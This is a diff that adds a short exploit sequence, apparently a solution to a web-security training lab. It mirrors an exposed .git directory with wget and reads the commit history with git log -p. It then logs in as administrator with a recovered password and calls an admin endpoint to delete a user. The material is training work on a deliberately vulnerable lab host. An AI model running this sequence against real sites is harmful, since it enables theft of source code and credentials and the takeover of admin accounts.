@@ -1,0 +1,19 @@
+GET /.git HTTP/1.1
+
+GET /.git/logs/HEAD HTTP/1.1
+
+$ wget -r https://aca31faa1fb0e954c0ef34e0006a00ca.web-security-academy.net/.git
+
+$ cd aca31faa1fb0e954c0ef34e0006a00ca.web-security-academy.net/.git
+
+$ git log
+
+$ git log -p
+
+POST /login HTTP/1.1
+
+csrf=IEmhZ0euqXGR8LAb4zMaaW7DrT05Ft43&username=administrator&password=6glkczlzw9oowm0780xi
+
+GET /admin HTTP/1.1
+
+GET /admin/delete?username=carlos HTTP/1.1
